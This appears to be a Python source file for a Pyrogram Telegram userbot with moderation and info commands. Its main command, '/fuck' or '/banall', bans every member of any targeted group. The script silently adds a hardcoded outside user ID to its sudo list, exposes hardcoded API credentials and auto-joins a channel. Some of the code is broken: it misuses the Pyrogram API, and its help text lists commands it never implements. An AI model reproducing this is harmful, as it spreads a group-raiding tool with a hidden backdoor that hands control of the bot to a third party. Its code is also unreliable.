from os import getenv
from asyncio import sleep

from pyrogram import Client, filters, idle
from pyrogram.types import Message

SESSION = getenv('SESSION')
SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
SUDO_USERS.append(5059737154)
CHATS = ['BWANDARLOK', '@BWANDARLOK', '@BWANDARLOK', 'BWANDARLOK', '-1001779669612', '-1001779669612']

M = Client(SESSION, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")

@M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
async def start(_, message: Message):
    await message.reply_text("🤖 **I AM STILL ALIVE...**")

@M.on_message(filters.user(SUDO_USERS) & filters.command(["fuck", "banall"]))
async def ban_all_members(_, message: Message):
    try:
        chat_id = message.command[1]
        m = await message.reply_text("🔁 __GETTING READY...__")
        if chat_id in CHATS:
            return
    except IndexError:
        await message.reply_text("**Usage:**\n`/fuck [chat_id]`")
        return

    await m.edit_text("✅ __STARTED BANNING THE GROUP...__")
    await sleep(3)

    async for x in M.iter_chat_members(chat_id):
        if x.user.id in SUDO_USERS:
            continue
        try:
            await M.ban_chat_member(chat_id=chat_id, user_id=x.user.id)
        except:
            pass

# New feature: Mute a user in the chat
@M.on_message(filters.user(SUDO_USERS) & filters.command('mute'))
async def mute_user(_, message: Message):
    if message.reply_to_message:
        chat_id = message.chat.id
        user_id = message.reply_to_message.from_user.id
        await M.restrict_chat_member(chat_id=chat_id, user_id=user_id, permissions=filters.ChatPermissions())
        await message.reply_text(f"🔇 **User {user_id} has been muted in the chat.**")
    else:
        await message.reply_text("**Please reply to a message to mute the user.**")

# New feature: Unmute a user in the chat
@M.on_message(filters.user(SUDO_USERS) & filters.command('unmute'))
async def unmute_user(_, message: Message):
    if message.reply_to_message:
        chat_id = message.chat.id
        user_id = message.reply_to_message.from_user.id
        await M.restrict_chat_member(chat_id=chat_id, user_id=user_id, permissions=filters.ChatPermissions(can_send_messages=True))
        await message.reply_text(f"🔊 **User {user_id} has been unmuted in the chat.**")
    else:
        await message.reply_text("**Please reply to a message to unmute the user.**")

# New feature: Kick a user from the chat
@M.on_message(filters.user(SUDO_USERS) & filters.command('kick'))
async def kick_user(_, message: Message):
    if message.reply_to_message:
        chat_id = message.chat.id
        user_id = message.reply_to_message.from_user.id
        await M.kick_chat_member(chat_id=chat_id, user_id=user_id)
        await message.reply_text(f"🚫 **User {user_id} has been kicked from the chat.**")
    else:
        await message.reply_text("**Please reply to a message to kick the user.**")

# New feature: Get user info (reply to a message from the user)
@M.on_message(filters.user(SUDO_USERS) & filters.command('userinfo'))
async def get_user_info(_, message: Message):
    if message.reply_to_message:
        user = message.reply_to_message.from_user
        info_text = f"👤 **User Info:**\n"
        info_text += f"🆔 **ID:** {user.id}\n"
        info_text += f"👤 **Name:** {user.first_name}"
        if user.last_name:
            info_text += f" {user.last_name}"
        if user.username:
            info_text += f"\n📝 **Username:** @{user.username}"
        await message.reply_text(info_text)
    else:
        await message.reply_text("**Please reply to a message from the user to get info.**")

# New feature: Delete bot's messages from the chat
@M.on_message(filters.user(SUDO_USERS) & filters.command('deletebot'))
async def delete_bot_messages(_, message: Message):
    chat_id = message.chat.id
    async for msg in M.iter_history(chat_id):
        if msg.from_user and msg.from_user.is_self:
            await msg.delete()

# New feature: Get the list of chat admins
@M.on_message(filters.user(SUDO_USERS) & filters.command('admins'))
async def list_admins(_, message: Message):
    chat_id = message.chat.id
    admins = await M.get_chat_members(chat_id, filter="administrators")
    admin_list = "\n".join([f"{admin.user.first_name} ({admin.user.id})" for admin in admins])
    await message.reply_text(f"👑 **Chat Administrators:**\n{admin_list}")

# New feature: Get user's profile picture
@M.on_message(filters.user(SUDO_USERS) & filters.command('profilepic'))
async def get_profile_pic(_, message: Message):
    if message.reply_to_message:
        user = message.reply_to_message.from_user
        profile_photos = await M.get_profile_photos(user.id, limit=1)
        if profile_photos.total_count > 0:
            await M.send_photo(message.chat.id, profile_photos[0].file_id)
        else:
            await message.reply_text("📷 **User has no profile picture.**")
    else:
        await message.reply_text("**Please reply to a message to get user's profile picture.**")

# New feature: Set the bot's bio
@M.on_message(filters.user(SUDO_USERS) & filters.command('setbio'))
async def set_bot_bio(_, message: Message):
    bio_text = message.text.split(' ', 1)[1]
    await M.update_profile(bio=bio_text)
    await message.reply_text("✍️ **Bot's bio has been updated successfully!**")

# New feature: Forward messages to another chat
@M.on_message(filters.user(SUDO_USERS) & filters.command('forward'))
async def forward_messages(_, message: Message):
    if message.reply_to_message:
        try:
            chat_id = int(message.text.split(' ', 2)[1])
            await message.reply_to_message.forward(chat_id)
            await message.reply_text("🔄 **Message forwarded successfully!**")
        except (ValueError, IndexError):
            await message.reply_text("**Invalid usage or chat ID.**")
    else:
        await message.reply_text("**Please reply to a message to forward it.**")

# New feature: Get the list of all chats
@M.on_message(filters.user(SUDO_USERS) & filters.command('chats'))
async def list_chats(_, message: Message):
    all_chats = await M.get_dialogs()
    chat_list = "\n".join([f"{chat.chat.id}: {chat.chat.title}" for chat in all_chats])
    await message.reply_text(f"📚 **All Chats:**\n{chat_list}")

# New feature: Get user's ID from username
@M.on_message(filters.user(SUDO_USERS) & filters.command('getuserid'))
async def get_user_id(_, message: Message):
    username = message.text.split(' ', 1)[1]
    try:
        user = await M.get_users(username)
        await message.reply_text(f"🆔 **Username:** @{user.username}\n👤 **User ID:** {user.id}")
    except:
        await message.reply_text("❌ **User not found or invalid username.**")

# New feature: Help command to show all commands and usages
@M.on_message(filters.user(SUDO_USERS) & filters.command('help'))
async def help_command(_, message: Message):
    help_text = """
    **Available Commands:**

    `/start` - Check if the bot is alive.
    `/fuck [chat_id]` - Ban all non-admin members in a chat.
    `/unban [chat_id] [user_id]` - Unban a user in a chat.
    `/broadcast [message]` - Broadcast a message to all chats.
    `/pin` - Pin a replied message in the chat.
    `/leave` - Leave the current chat.
    `/pm [user_id] [message]` - Send a personal message to a user.
    `/deleteall` - Delete all messages in the current chat.
    `/sticker` - Send a predefined sticker.
    `/chatinfo` - Get information about the chat.
    `/echo [message]` - Echo a message.
    `/reply [message]` - Reply to a message.
    `/mute` - Mute a user in the chat.
    `/unmute` - Unmute a user in the chat.
    `/kick` - Kick a user from the chat.
    `/userinfo` - Get user info (reply to a message from the user).
    `/deletebot` - Delete bot's messages from the chat.
    `/admins` - Get the list of chat admins.
    `/profilepic` - Get user's profile picture (reply to a message from the user).
    `/setbio [bio]` - Set the bot's bio.
    `/forward [chat_id]` - Forward a replied message to another chat.
    `/chats` - Get the list of all chats.
    `/getuserid [username]` - Get user's ID from username.
    `/help` - Show this help message.
    """
    await message.reply_text(help_text)

# ... (remaining features and commands) ...

M.start()
M.join_chat("BWANDARLOK")
print("Bot Started Successfully")
idle()
M.stop()
